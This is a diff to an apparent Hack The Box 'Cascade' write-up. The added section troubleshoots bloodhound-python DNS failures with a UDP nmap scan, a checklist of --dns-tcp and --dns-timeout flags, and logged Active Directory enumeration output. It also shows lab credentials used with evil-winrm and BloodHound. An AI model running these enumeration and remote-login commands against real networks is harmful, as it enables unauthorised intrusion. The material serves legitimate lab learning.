@@ -784,11 +784,86 @@ evil-winrm -i cascade.htb -u 'ArkSvc' -p 'w3lc0meFr31nd'
 ```
 successfully logged in, but it seems that we are not done here, we cant access the admin directory.
 
-tried running bloodhound
+### Bloodhound as ArkSvc
 ```shell
 bloodhound-python -u 'ArkSvc' -p 'w3lc0meFr31nd'  -d cascade.htb -ns 10.10.10.182 -c All --zip
 ```
-but again it does not work, lets find the info we need from the inside.
+but again it does not work, but WHY?
+
+By default, bloodhound uses UDP (normal DNS over UDP/53) by sending DNS SRV queries over UDP to whatever nameserver its using with the `-ns` parameter.
+
+Well, first of all, my initial nmap scan was TCP only and did not take into consideration UDP at all, so lets fix that:
+```shell
+sudo nmap -sU -p 53 --reason -v 10.129.30.110
+```
+
+```shell
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 13:43 CST
+Initiating Ping Scan at 13:43
+Scanning 10.129.30.110 [4 ports]
+Completed Ping Scan at 13:43, 0.10s elapsed (1 total hosts)
+Initiating UDP Scan at 13:43
+Scanning cascade.local (10.129.30.110) [1 port]
+Discovered open port 53/udp on 10.129.30.110
+Completed UDP Scan at 13:43, 0.21s elapsed (1 total ports)
+Nmap scan report for cascade.local (10.129.30.110)
+Host is up, received echo-reply ttl 127 (0.085s latency).
+
+PORT   STATE SERVICE REASON
+53/udp open  domain  udp-response ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
+           Raw packets sent: 6 (250B) | Rcvd: 2 (132B)
+```
+Now its clear that:
+- UDP port 53 is actually open.
+- Nmap received a UDP response (udp-response ttl 127) → the server is replying to UDP packets.
+- This proves that UDP is not blocked at the network or firewall level
+
+So we need to try sth else, and i found online that wee need to tell bloodhound to use TCP and dns timeout!
+
+#### Why BloodHound needs `--dns-tcp` and `--dns-timeout`
+
+Even though UDP is open:
+1. BloodHound’s SRV lookup uses Python (dnspython).
+2. Some Windows AD DNS servers (especially 2008 R2 / lab setups) sometimes respond unreliably to SRV queries over UDP, or require TCP if the packet is larger than ~512 bytes (common for SRV discovery).
+3. Increasing the timeout (--dns-timeout 10) and forcing TCP (--dns-tcp) ensures BloodHound reliably receives the full SRV record.
+
+In our case, 
+
+Here i prepared a small checklist for when default bloodhound usage is not sufficient:
+1. Start: -ns <DNS_IP> → default UDP
+2. If UDP fails: add --dns-tcp
+3. If still failing: increase timeout --dns-timeout 10
+4. If still failing: skip SRV, use -dc <DC_FQDN> + --disable-autogc
+```shell
+bloodhound-python -u 's.smith' -p 'sT333ve2' -d cascade.local -ns 10.129.30.110 --dns-tcp --dns-timeout 10 -c All --zip
+```
+and its clear that bloodhound now runs successfully:
+```shell
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: cascade.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (casc-dc1.cascade.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: casc-dc1.cascade.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: casc-dc1.cascade.local
+INFO: Found 18 users
+INFO: Found 53 groups
+INFO: Found 7 gpos
+INFO: Found 6 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: CASC-DC1.cascade.local
+INFO: Done in 00M 22S
+INFO: Compressing output into 20251110133123_bloodhound.zip
+```
+
+Assuming that bloodhound couldnt work, lets find the info we need from the inside.
 
 #### Group membership of ArkSvc
 
